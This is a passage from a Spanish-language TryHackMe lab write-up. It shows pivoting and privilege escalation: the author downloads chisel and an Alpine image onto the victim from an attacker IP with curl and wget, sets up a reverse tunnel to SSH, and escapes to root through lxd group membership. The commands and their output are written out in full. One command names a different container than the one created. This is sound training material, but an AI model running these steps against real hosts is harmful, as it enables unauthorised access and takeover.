+<p>Seguido de esto nos descargamos chisel en la máquina víctima, dentro del directorio <code class="language-plaintext highlighter-rouge">/tmp</code>,  haciendo una petición a nuestra máquina con curl</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
+www-data@3d56c33f6dd7:/tmp<span class="nv">$ </span>curl http://[TU_IP]/chisel <span class="nt">-o</span> chisel
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/tmp<span class="nv">$ </span>curl http://10.9.242.217/chisel <span class="nt">-o</span> chisel
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 8144k  100 8144k    0     0  91654      0  0:01:30  0:01:30 <span class="nt">--</span>:--:--  109k
+</code></pre></div></div>
+<p>Le otorgamos permisos de ejecución</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel
+</code></pre></div></div>
+<p>Lo ejecutamos en nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 6789
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2021/08/24 13:28:00 server: Reverse tunnelling enabled
+2021/08/24 13:28:00 server: Fingerprint YJAb4PvHPP98LLMeCwzvdvHPQPBcWWibsBY/eFUy4H0<span class="o">=</span>
+2021/08/24 13:28:00 server: Listening on http://0.0.0.0:6789
+</code></pre></div></div>
+<p>Y luego en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/tmp<span class="nv">$ </span>./chisel client 10.9.242.217:6789 R:2222:172.18.0.1:22
+2021/08/24 18:28:43 client: Connecting to ws://10.9.242.217:6789
+2021/08/24 18:28:44 client: Connected <span class="o">(</span>Latency 192.044629ms<span class="o">)</span>
+</code></pre></div></div>
+<p>Comprobamos que el puerto 2222 esté activo en nuestra máquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> lsof <span class="nt">-i</span>:2222
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>COMMAND    PID         USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+chisel  214968 invertebrado    8u  IPv6 471556      0t0  TCP <span class="k">*</span>:2222 <span class="o">(</span>LISTEN<span class="o">)</span>
+</code></pre></div></div>
+<p>De esta manera ya podemos conectarnos por ssh a la máquina víctima desde nuestra máquina usando las mismas credenciales que usamos al principio</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> ssh sysadmin@127.0.0.1 <span class="nt">-p</span> 2222
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The authenticity of host <span class="s1">'[127.0.0.1]:2222 ([127.0.0.1]:2222)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="o">[</span>127.0.0.1]:2222<span class="s1">' (ECDSA) to the list of known hosts.
+sysadmin@127.0.0.1'</span>s password: 
+Welcome to Ubuntu 16.04.2 LTS <span class="o">(</span>GNU/Linux 4.4.0-62-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+263 packages can be updated.
+181 updates are security updates.
+
+
+Last login: Sat Nov 21 15:30:19 2020
+sysadmin@ubuntu:~<span class="nv">$ </span><span class="nb">whoami
+</span>sysadmin
+</code></pre></div></div>
+
+<p>Logramos Entrar como el usuario sysadmin y podemos leer la flag1</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span><span class="nb">ls
+</span>flag1.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span><span class="nb">cat </span>flag1.txt
+o&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>i
+</code></pre></div></div>
+
+<p>Para la última flag debemos de abusar del grupo lxd en el que está el usuario sysadmin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span><span class="nb">id</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sysadmin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>sysadmin<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+122<span class="o">(</span>docker<span class="o">)</span>
+</code></pre></div></div>
+<p>Para esto nos clonamos el siguiente repositorio en nuestra máquina, que nos permitirá escalar privilegios</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> git clone https://github.com/saghul/lxd-alpine-builder.git
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cloning into <span class="s1">'lxd-alpine-builder'</span>...
+remote: Enumerating objects: 35, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>8/8<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>8/8<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 35 <span class="o">(</span>delta 2<span class="o">)</span>, reused 2 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 27
+Receiving objects: 100% <span class="o">(</span>35/35<span class="o">)</span>, 21.69 KiB | 264.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>8/8<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">cd </span>lxd-alpine-builder
+~<span class="nv">$&gt;</span> <span class="nb">sudo</span> ./build-alpine
+</code></pre></div></div>
+<p>Iniciamos un servidor http con python3</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+<p>Y esto en la máquina víctima:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>wget http://10.9.242.217/alpine-v3.14-x86_64-20210824_1357.tar.gz
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc image import ./alpine-v3.14-x86_64-20210824_1357.tar.gz <span class="nt">--alias</span> pwned
+Image imported with fingerprint: 1b618f2f54435ff6cd80a76e25d0f5070d4ebf16d7f730a0ea850164bd99655f
+</code></pre></div></div>
+<p>Listamos las imagenes existentes</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc image list
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| pwned | 1b618f2f5443 | no     | alpine v3.14 <span class="o">(</span>20210824_13:57<span class="o">)</span> | x86_64 | 3.11MB | Aug 24, 2021 at 7:05pm <span class="o">(</span>UTC<span class="o">)</span> |
++-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+</code></pre></div></div>
+<p>Ahí vemos la que acabamos de crear (pwned)</p>
+
+<p>Y finalmente ejecutamos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc init pwned invertebrado <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true
+</span>Creating invertebrado
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc config device add invertebrado miequipo disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true
+</span>Device miequipo added to invertebrado
+</code></pre></div></div>
+<p>Iniciamos el contenedor (en mi caso invertebrado)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc start invertebrado
+</code></pre></div></div>
+<p>Y por último</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysadmin@ubuntu:~<span class="nv">$ </span>lxc <span class="nb">exec </span>sckull /bin/sh
+~ <span class="c">#</span>
+</code></pre></div></div>
+<p>Ya somos root!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="c"># whoami</span>
+root
+</code></pre></div></div>
+<p>Podemos leer la flag dentro de <code class="language-plaintext highlighter-rouge">/mnt/root/root/</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~ <span class="c"># cat /mnt/root/root/root.txt</span>
+K&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>j
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#brute-force" class="page__taxonomy-item" rel="tag">brute force</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#chisel" class="page__taxonomy-item" rel="tag">chisel</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#docker" class="page__taxonomy-item" rel="tag">docker</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pivoting" class="page__taxonomy-item" rel="tag">pivoting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python-scripting" class="page__taxonomy-item" rel="tag">python scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#scripting" class="page__taxonomy-item" rel="tag">scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-24T00:00:00-05:00">August 24, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/thm-the-marketplace/" class="pagination--pager" title="The Marketplace - Try Hack Me
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Invertebrado</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
